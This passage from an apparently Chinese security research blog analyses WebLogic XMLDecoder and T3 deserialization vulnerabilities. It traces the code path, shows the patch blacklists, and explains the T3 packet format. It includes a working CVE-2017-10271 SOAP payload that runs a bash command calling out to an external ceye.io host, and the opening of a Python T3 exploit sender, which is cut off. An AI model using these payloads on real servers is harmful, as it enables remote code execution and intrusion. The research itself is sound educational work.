src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681456704_6438fe408e0666cf95066.png!small" alt="image-20230308214220872.png"></p><p>能看到我们传递进来的数据</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public NextAction processRequest(Packet var1) {</span><br><span class="line">        this.isUseOldFormat = false;</span><br><span class="line">        if (var1.getMessage() != null) {</span><br><span class="line">            HeaderList var2 = var1.getMessage().getHeaders();</span><br><span class="line">            Header var3 = var2.get(WorkAreaConstants.WORK_AREA_HEADER, true);</span><br><span class="line">            if (var3 != null) {</span><br><span class="line">                this.readHeaderOld(var3);</span><br><span class="line">                this.isUseOldFormat = true;</span><br><span class="line">            }</span><br></pre></td></tr></tbody></table></figure><p>继续跟<strong>readHeaderOld</strong>,进入<strong>WorkContextTube</strong>类</p><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681456753_6438fe7159c6f6b855195.png!small" alt="image-20230309204950625.png"></p><p>再跟进<strong>WorkContextXmlInputAdapter</strong>类，进入到他的构造方法中</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public WorkContextXmlInputAdapter(InputStream var1) {</span><br><span class="line">        this.xmlDecoder = new XMLDecoder(var1);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>此时的var1就是我们传入的payload</p><p>这样的话，一个<strong>XMLDecoder</strong>反序列化对象就构建完成了，但是这样还是不够的，需要找一个调用**readObject()**的地方，才能完成反序列化</p><p>我们回到<strong>WorkContextTube</strong>类，在构建完一个WorkContextXmlInputAdapter对象后，调用了receive方法</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WorkContextXmlInputAdapter var6 = new WorkContextXmlInputAdapter(new ByteArrayInputStream(var4.toByteArray()));</span><br><span class="line">this.receive(var6);</span><br></pre></td></tr></tbody></table></figure><p>跟进到<strong>WorkContextClientTube</strong>类的<strong>receive</strong>方法</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">protected void receive(WorkContextInput var1) throws IOException {</span><br><span class="line">        WorkContextMapInterceptor var2 = WorkContextHelper.getWorkContextHelper().getInterceptor();</span><br><span class="line">        var2.receiveResponse(var1);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>后面不拿上来了，直接把调用链放到这里<br><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681456781_6438fe8d723569dea5fbb.png!small" alt="image-20230310105524945.png"><br>最后进到<strong>WorkContextXmlInputAdapter</strong>类的readUTF()方法里面调用了readObject<br><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681456791_6438fe97d67bc69b0bf74.png!small" alt="image-20230310105634281.png"></p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>在后来的版本中对漏洞进行修复，但是只过滤了object</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">private void validate(InputStream is) {</span><br><span class="line">      WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();</span><br><span class="line">      try {</span><br><span class="line">         SAXParser parser = factory.newSAXParser();</span><br><span class="line">         parser.parse(is, new DefaultHandler() {</span><br><span class="line">            public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {</span><br><span class="line">               if(qName.equalsIgnoreCase("object")) {</span><br><span class="line">                  throw new IllegalStateException("Invalid context type: object");</span><br><span class="line">               }</span><br><span class="line">            }</span><br><span class="line">         });</span><br><span class="line">      } catch (ParserConfigurationException var5) {</span><br><span class="line">         throw new IllegalStateException("Parser Exception", var5);</span><br><span class="line">      } catch (SAXException var6) {</span><br><span class="line">         throw new IllegalStateException("Parser Exception", var6);</span><br><span class="line">      } catch (IOException var7) {</span><br><span class="line">         throw new IllegalStateException("Parser Exception", var7);</span><br><span class="line">      }</span><br><span class="line">   }</span><br></pre></td></tr></tbody></table></figure><h3 id="绕过-CVE-2017-10271"><a href="#绕过-CVE-2017-10271" class="headerlink" title="绕过(CVE-2017-10271)"></a>绕过(CVE-2017-10271)</h3><p>过滤了object标签，因为void和object的handler因为是父子类关系，所以把上面的object标签替换为void即可。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;</span><br><span class="line">  &lt;soapenv:Header&gt;</span><br><span class="line">    &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;</span><br><span class="line">        &lt;java version="1.8.0_131" class="java.beans.XMLDecoder"&gt;</span><br><span class="line">          &lt;void class="java.lang.ProcessBuilder"&gt;</span><br><span class="line">            &lt;array class="java.lang.String" length="3"&gt;</span><br><span class="line">              &lt;void index="0"&gt;</span><br><span class="line">                &lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">              &lt;/void&gt;</span><br><span class="line">              &lt;void index="1"&gt;</span><br><span class="line">                &lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">              &lt;/void&gt;</span><br><span class="line">              &lt;void index="2"&gt;</span><br><span class="line">                &lt;string&gt;ping 999.merkwg.ceye.io&lt;/string&gt;</span><br><span class="line">              &lt;/void&gt;</span><br><span class="line">            &lt;/array&gt;</span><br><span class="line">          &lt;void method="start"/&gt;&lt;/void&gt;</span><br><span class="line">        &lt;/java&gt;</span><br><span class="line">      &lt;/work:WorkContext&gt;</span><br><span class="line">    &lt;/soapenv:Header&gt;</span><br><span class="line">  &lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="再次修复"><a href="#再次修复" class="headerlink" title="再次修复"></a>再次修复</h3><p>在后面的修复中采用黑白名单结合的方式进行修复，就很难攻击了</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">private void validate(InputStream is) {</span><br><span class="line">   WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();</span><br><span class="line">   try {</span><br><span class="line">      SAXParser parser = factory.newSAXParser();</span><br><span class="line">      parser.parse(is, new DefaultHandler() {</span><br><span class="line">         private int overallarraylength = 0;</span><br><span class="line">         public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {</span><br><span class="line">            if(qName.equalsIgnoreCase("object")) {</span><br><span class="line">               throw new IllegalStateException("Invalid element qName:object");</span><br><span class="line">            } else if(qName.equalsIgnoreCase("new")) {</span><br><span class="line">               throw new IllegalStateException("Invalid element qName:new");</span><br><span class="line">            } else if(qName.equalsIgnoreCase("method")) {</span><br><span class="line">               throw new IllegalStateException("Invalid element qName:method");</span><br><span class="line">            } else {</span><br><span class="line">               if(qName.equalsIgnoreCase("void")) {</span><br><span class="line">                  for(int attClass = 0; attClass &lt; attributes.getLength(); ++attClass) {</span><br><span class="line">                     if(!"index".equalsIgnoreCase(attributes.getQName(attClass))) {</span><br><span class="line">                        throw new IllegalStateException("Invalid attribute for element void:" + attributes.getQName(attClass));</span><br><span class="line">                     }</span><br><span class="line">                  }</span><br><span class="line">               }</span><br><span class="line">               if(qName.equalsIgnoreCase("array")) {</span><br><span class="line">                  String var9 = attributes.getValue("class");</span><br><span class="line">                  if(var9 != null &amp;&amp; !var9.equalsIgnoreCase("byte")) {</span><br><span class="line">                     throw new IllegalStateException("The value of class attribute is not valid for array element.");</span><br><span class="line">                  }</span><br></pre></td></tr></tbody></table></figure><h3 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h3><p>POC详情参考我的github仓库<a target="_blank" rel="noopener" href="https://github.com/feiweiliang/XMLDecoder_unser">https://github.com/feiweiliang/XMLDecoder_unser</a></p><h2 id="4-T3反序列化漏洞"><a href="#4-T3反序列化漏洞" class="headerlink" title="4.T3反序列化漏洞"></a>4.T3反序列化漏洞</h2><h3 id="相似概念总结"><a href="#相似概念总结" class="headerlink" title="相似概念总结"></a>相似概念总结</h3><ul><li><strong>JNDI</strong></li></ul><p>JNDI提供<strong>统一的客户端API</strong>，为开发人员提供了查找和访问<strong>各种命名和目录服务</strong>的通用、统一的接口。</p><p>JNDI可以兼容和访问现有目录服务如：DNS、XNam、LDAP、CORBA对象服务、文件系统、RMI、DSML v1&amp;v2、NIS等。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jdbc://&lt;domain&gt;:&lt;port&gt;</span><br><span class="line">rmi://&lt;domain&gt;:&lt;port&gt;</span><br><span class="line">ldap://&lt;domain&gt;:&lt;port&gt;</span><br></pre></td></tr></tbody></table></figure><p><span class="colour" style="color:red">我们就把JNDI想象成接线员，给JNDI打电话，备注上rmi，他就把线接到RMI了</span></p><ul><li><strong>RMI</strong></li></ul><p>RMI(Remote Method Invocation)即<strong>远程方法调用</strong>。能够让在<strong>某个Java虚拟机上的对象</strong>像<strong>调用本地对象一样</strong>调用<strong>另一个Java虚拟机中的对象上的方法</strong>。它支持序列化的Java类的直接传输和分布垃圾收集。</p><p>Java RMI的<strong>默认基础通信协议为JRMP</strong>，但其也支持开发其他的协议用来优化RMI的传输，或者兼容非JVM，如WebLogic的T3和兼容CORBA的IIOP，其中T3协议为本文重点，后面会详细说。</p><p>图片来自：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qxkV/_7MZVhUYYq5QGcwCtQ![image-20230305201921034.png](/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681457276_6439007c152fee349c9bb.png!small)">https://mp.weixin.qq.com/s/qxkV\_7MZVhUYYq5QGcwCtQ![image-20230305201921034.png](/images/初窥weblogic漏洞之XMLDecoder和T3反序列化漏洞.assets/1681457276_6439007c152fee349c9bb.png!small)</a></p><h3 id="WebLogic-RMI"><a href="#WebLogic-RMI" class="headerlink" title="WebLogic RMI"></a>WebLogic RMI</h3><p><strong>WebLogic RMI和Java RMI的不同之处：</strong></p><ul><li>WebLogic RMI支持集群部署和负载均衡</li><li>WebLogic RMI的服务端会使用字节码生成（Hot Code Generation）功能生成代理对象</li><li>WebLogic RMI客户端使用动态代理</li><li>WebLogic RMI主要使用<strong>T3协议</strong>（还有基于CORBA的IIOP协议）进行客户端到服务端的数据传输</li></ul><p><strong>T3协议：</strong></p><ul><li>服务端可以持续追踪监控客户端是否存活（心跳机制），通常心跳的间隔为60秒，服务端在超过240秒未收到心跳即判定与客户端的连接丢失</li><li>通过建立一次连接可以将全部数据包传输完成，优化了数据包大小和网络消耗。</li></ul><p>图片来自：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qxkV/_7MZVhUYYq5QGcwCtQ">https://mp.weixin.qq.com/s/qxkV\_7MZVhUYYq5QGcwCtQ</a><br><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681457326_643900aed4276e4f6b8da.png!small" alt="image-20230305203422590.png"></p><p><strong>构建WebLogic RMI服务端和客户端</strong></p><p>这里的代码都是来自大佬的文章(<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qxkV/_7MZVhUYYq5QGcwCtQ">https://mp.weixin.qq.com/s/qxkV\_7MZVhUYYq5QGcwCtQ</a>)</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//首先依然是创建服务端对象类，先创建一个接口继承java.rmi.Remote:</span><br><span class="line">// IHello.java</span><br><span class="line">package examples.rmi.hello;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">public interface IHello extends java.rmi.Remote {</span><br><span class="line">    String sayHello() throws RemoteException;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//创建服务端对象类，实现这个接口：</span><br><span class="line">// HelloImpl.java</span><br><span class="line">public class HelloImpl implements IHello {</span><br><span class="line">    public String sayHello() {</span><br><span class="line">        return "Hello Remote World!!";</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">//创建服务端远程对象，此时已不需要Skeleton对象和UnicastRemoteObject对象：</span><br><span class="line">// HelloImpl.java</span><br><span class="line">package examples.rmi.hello;</span><br><span class="line">import javax.naming.*;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">public class HelloImpl implements IHello {</span><br><span class="line">    private String name;</span><br><span class="line">    public HelloImpl(String s) throws RemoteException {</span><br><span class="line">        super();</span><br><span class="line">        name = s;</span><br><span class="line">    }</span><br><span class="line">    public String sayHello() throws java.rmi.RemoteException {</span><br><span class="line">        return "Hello World!";</span><br><span class="line">    }</span><br><span class="line">    public static void main(String args[]) throws Exception {</span><br><span class="line">        try {</span><br><span class="line">            HelloImpl obj = new HelloImpl("HelloServer");</span><br><span class="line">            Context ctx = new InitialContext();</span><br><span class="line">            ctx.bind("HelloServer", obj);</span><br><span class="line">            System.out.println("HelloImpl created and bound in the registry " +</span><br><span class="line">                    "to the name HelloServer");</span><br><span class="line">        } catch (Exception e) {</span><br><span class="line">            System.err.println("HelloImpl.main: an exception occurred:");</span><br><span class="line">            System.err.println(e.getMessage());</span><br><span class="line">            throw e;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">//WebLogic RMI的服务端已经构建完成，客户端也不再需要Stub对象：</span><br><span class="line">// HelloClient.java</span><br><span class="line">package examples.rmi.hello;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.InitialContext;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line">public class HelloClient {</span><br><span class="line">    // Defines the JNDI context factory.</span><br><span class="line">    public final static String JNDI_FACTORY = "weblogic.jndi.WLInitialContextFactory";</span><br><span class="line">    int port;</span><br><span class="line">    String host;</span><br><span class="line">    private static void usage() {</span><br><span class="line">        System.err.println("Usage: java examples.rmi.hello.HelloClient " +</span><br><span class="line">                "&lt;hostname&gt; &lt;port number&gt;");</span><br><span class="line">    }</span><br><span class="line">    public HelloClient() {</span><br><span class="line">    }</span><br><span class="line">    public static void main(String[] argv) throws Exception {</span><br><span class="line">        if (argv.length &lt; 2) {</span><br><span class="line">            usage();</span><br><span class="line">            return;</span><br><span class="line">        }</span><br><span class="line">        String host = argv[0];</span><br><span class="line">        int port = 0;</span><br><span class="line">        try {</span><br><span class="line">            port = Integer.parseInt(argv[1]);</span><br><span class="line">        } catch (NumberFormatException nfe) {</span><br><span class="line">            usage();</span><br><span class="line">            throw nfe;</span><br><span class="line">        }</span><br><span class="line">        try {</span><br><span class="line">            InitialContext ic = getInitialContext("t3://" + host + ":" + port);</span><br><span class="line">            IHello obj = (IHello) ic.lookup("HelloServer");</span><br><span class="line">            System.out.println("Successfully connected to HelloServer on " +</span><br><span class="line">                    host + " at port " +</span><br><span class="line">                    port + ": " + obj.sayHello());</span><br><span class="line">        } catch (Exception ex) {</span><br><span class="line">            System.err.println("An exception occurred: " + ex.getMessage());</span><br><span class="line">            throw ex;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    private static InitialContext getInitialContext(String url)</span><br><span class="line">            throws NamingException {</span><br><span class="line">        Hashtable&lt;String, String&gt; env = new Hashtable&lt;String, String&gt;();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);</span><br><span class="line">        env.put(Context.PROVIDER_URL, url);</span><br><span class="line">        return new InitialContext(env);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>项目中引入<code>wlthint3client.jar</code>这个jar包供客户端调用时可以找到<code>weblogic.jndi.WLInitialContextFactory</code>。</p><p>maven中生成jar包的配置</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line">&lt;project xmlns="http://maven.apache.org/POM/4.0.0"</span><br><span class="line">         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"</span><br><span class="line">         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line">    &lt;groupId&gt;examples.rmi&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;hello&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">    &lt;build&gt;</span><br><span class="line">        &lt;plugins&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;configuration&gt;</span><br><span class="line">                    &lt;source&gt;1.6&lt;/source&gt;</span><br><span class="line">                    &lt;target&gt;1.6&lt;/target&gt;</span><br><span class="line">                &lt;/configuration&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;configuration&gt;</span><br><span class="line">                    &lt;archive&gt;</span><br><span class="line">                        &lt;manifest&gt;</span><br><span class="line">                            &lt;addClasspath&gt;true&lt;/addClasspath&gt;</span><br><span class="line">                            &lt;useUniqueVersions&gt;false&lt;/useUniqueVersions&gt;</span><br><span class="line">                            &lt;classpathPrefix&gt;lib/&lt;/classpathPrefix&gt;</span><br><span class="line">                            &lt;mainClass&gt;examples.rmi.hello.HelloImpl&lt;/mainClass&gt;</span><br><span class="line">                        &lt;/manifest&gt;</span><br><span class="line">                    &lt;/archive&gt;</span><br><span class="line">                &lt;/configuration&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">        &lt;/plugins&gt;</span><br><span class="line">    &lt;/build&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></tbody></table></figure><p>使用<code>maven package</code>命令即可打包,在target目录下可以看到打好的包</p><p>构建成功后，将jar包复制到WebLogic Server域对应的<code>lib/</code>文件夹中，</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp D:\Programs\JavaProjects\weblogic_T3\target\hello-1.0-SNAPSHOT.jar 870db625daa5:/u01/app/oracle/Domains/ExampleSilentWTDomain/lib</span><br></pre></td></tr></tbody></table></figure><p>通过WebLogic Server 管理控制台中的启动类和关闭类部署到WebLogic Server中，新建启动类如下：</p><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681457382_643900e6efc8fa6766b6e.png!small" alt="image-20230405095400883.png"></p><p>重启weblogic(也可以重启docker)后，通过 <strong>环境-服务器-AdminServer-查看 JNDI树</strong>看到<code>HelloServer</code>已存在</p><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681457391_643900ef71fad70090006.png!small" alt="image-20230405152215608.png"></p><p>客户端连接服务端</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ".;wlthint3client.jar;hello-1.0-SNAPSHOT.jar" examples.rmi.hello.HelloClient 127.0.0.1 7001</span><br></pre></td></tr></tbody></table></figure><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681457745_64390251b5083e13cdf87.png!small" alt="image-20230405153103571.png"></p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>抓包来分析一下这个过程中发送的数据包</p><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681457758_6439025ee3bf8412793ec.png!small" alt="image-20230405195301379.png"></p><p>第一个数据包是我们发送的请求头，第二个数据包是weblogic回复HELO和版本，第三个才是调用RMI服务的数据包，我们来分析一下</p><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681457771_6439026b8f08a7ccdac4b.png!small" alt="image-20230405202712658.png"></p><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681457787_6439027bc4ce9181d51f6.png!small" alt="image-20230405202937725.png"></p><p>我们发现了这个T3数据包的结构：</p><p>从一个T3协议头开始，后面跟上序列化对象，并在序列化对象前面加上fe010000</p><p><img src="/images/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1681457801_6439028906a344d7e45c0.png!small" alt="image-20230406160546119.png"></p><p>那我们就可以尝试使用<strong>恶意的</strong>序列化对象来<strong>替换</strong>其中一个序列化对象从而触发漏洞。(注意替换之后重新计算数据包长度)</p><p>先发送一个握手包</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import struct # 负责大小端的转换</span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"># 第一个和第二个参数，传入目标IP和端口</span><br><span class="line">server_address = (sys.argv[1], int(sys.argv[2]))</span><br><span class="line">print(f'connecting to {server_address[0]} port {server_address[1]}')</span><br><span class="line">sock.connect(server_address)</span><br><span class="line"># 发送握手包</span><br><span class="line">handshake='t3 10.3.6\nAS:255\nHL:19\n\n'</span><br><span class="line">print(f'sending "{handshake}"')</span><br><span class="line">sock.sendall(handshake.encode())</span><br><span class="line">data = sock.recv(1024)</span><br><span class="line">print(f'received "{data.decode()}"')</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">connecting to 127.0.0.1 port 7001</span><br><span class="line">sending 